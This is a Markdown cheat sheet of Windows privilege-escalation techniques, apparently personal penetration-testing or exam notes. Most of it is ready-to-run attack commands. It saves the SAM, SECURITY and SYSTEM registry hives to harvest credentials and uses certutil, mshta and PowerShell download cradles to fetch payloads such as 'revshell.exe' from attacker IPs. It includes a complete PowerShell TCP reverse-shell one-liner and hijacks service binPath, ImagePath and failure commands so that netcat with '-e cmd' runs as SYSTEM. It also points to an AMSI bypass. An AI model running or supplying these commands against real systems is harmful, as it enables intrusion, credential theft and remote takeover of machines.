# Windows Privilege Escalation tools to help me get system access.


## GREAT Privesc Resources

Gread Windows Privilege Escalation Walk-through:

https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

https://github.com/AonCyberLabs/Windows-Exploit-Suggester

https://book.hacktricks.xyz/windows/windows-local-privilege-escalation

https://github.com/frizb/Windows-Privilege-Escalation

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

### [Windows-Privesc-Check]

```
Usage:
windows-privesc-check2.exe --audit -a -o wpc-report
```
More information Regarding Windows-Privesc-Check please refer to: https://github.com/pentestmonkey/windows-privesc-check/blob/master/docs/QuickStartUsage.md

### [Check current priv]
```
whoami /priv
```

### [Check hotfixes]
```
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### [Check Services]
```
get-acl HKLM:\System\CurrentControlSet\services\*
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *| findstr /i "<username> Users Path"
```

### [Get Service Name and Path (May Require Escalated Privileges]
```
Get-Service
Get-WmiObject win32_service | ?{$_.Name -like '*<ServiceName>*'} | select Name, DisplayName, State, PathName
```

### [Process Dumping Procdump.exe]
https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

```
Usage:
Full Dump
& 'C:\users\accountname\procdump64.exe' -accepteula -ma PIDorPROCESS dumpname.dmp

Mini Dump
& 'C:\users\accountname\procdump64.exe' -accepteula -ma PIDorPROCESS dumpname.dmp
```

### [Enumerate Windows System Creds without tools]
```
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system
```

### [Powerup.ps1 Usage]
```
Manual Powershell Priv esc powerup.ps1
powershell -nop -exec bypass
Import-Module .\powerup.ps1
Invoke-AllChecks
```

### [PowerView.ps1 Usage for Active Directory Objects]
```
powershell -nop -exec bypass
Import-Module .\PowerView.ps1
Get-AdObject
If you receive any errors it's possible AMSI is preventing execution. Look into AMSIbypass. EvilwinRM i use Bypass 4MSI
```

### [Download file]

[Cert Util]
```
certutil.exe -urlcache -split -f http[:]//10.10.10.10/exploit.exe
```

[mshta]
```
mshta http[:]//10.10.10.10/badthings.exe
```

[Powershell]
```
powershell IWR -Uri http[:]//myip/filename.exe -OutFile filename.exe
powershell "(new-object System.Net.WebClient).Downloadfile('http[:]//10.10.14.15:8000/revshell.exe', 'revshell.exe')"
```

### [Upgrading to powershell - Replace the placeholders with your local IP and PORT]
```
$client​ = New-Object System.Net.Sockets.TCPClient(​ "<IPADDRESS>"​ ,<PORT>);​ $stream​ =
$client​ .GetStream();[byte[]]​ $bytes​ = 0..65535|%{0};​ while​ ((​ $i​ = ​ $stream​ .Read(​ $bytes​ ,
0, ​ $bytes​ .Length)) -ne 0){;​ $data​ = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString(​ $bytes​ ,0, ​ $i​ );​ $sendback​ = (iex ​ $data​ 2>&1 |
Out-String );​ $sendback2​ = ​ $sendback​ + ​ "PS "​ + (​ pwd​ ).Path + ​ "> "​ ; ​ $sendbyte​ =
([text.encoding]::ASCII).GetBytes(​ $sendback2​ );​ $stream​ .Write(​ $sendbyte​ ,0,​ $sendbyte​ .L
ength);​ $stream​ .Flush()};​ $client​ .Close()
```

```
START /B "" powershell "(new-object System.Net.WebClient).Downloadfile('http://example:port/shell.ps1', 'shell.ps1')"
```

### [Modify Registries using powershell]
```
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlset\services\wuauserv" -Name ImagePath -Value "C:\path\to\nc.exe IP PORT -e cmd"
```
### [executing program as a different username in powershell]
```
powershell -nop -exec bypass
$username = "<WORKSTATION\username>"
$password =  ConvertTo-SecureString "<password>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
Invoke-Command -ComputerName WORKSTATION -Credential $creds -ScriptBlock {C:\path\to\nc.exe IP PORT -e cmd.exe}
```
### [BinPath and ImagePath]
https://pentestlab.blog/tag/imagepath/
```
binPath
sc config wuauserv binPath="C:\path\to\nc.exe IP PORT -e cmd"
sc query wuauserv
sc start Fax

ImagePath
sc config Fax binPath= "C:\payload.exe"
sc config Fax binPath= "C:\payload.exe" start="auto" obj="LocalSystem"
sc config Fax binPath= "C:\Windows\System32\payload.exe" start="auto" obj="LocalSystem"
sc start Fax

failure commands
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v ImagePath /t REG_SZ /d "C:\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time" /v FailureCommand /t REG_SZ /d "C:\payload.exe"
sc failure Fax command= "\"c:\Windows\system32\payload.exe\""
```

### [Locate and Portfoward using ssh]
```
netstat -tulpn | grep LISTEN
ssh -L 8000:127.0.0.1:8000 username@IP
ssh -L 8000:127.0.0.1:8000 -i id_rsa username@IP
```

### [Escaping Vi, Vim and Nano]
https://gtfobins.github.io/gtfobins/vi/

https://gtfobins.github.io/gtfobins/vim/

https://gtfobins.github.io/gtfobins/nano/
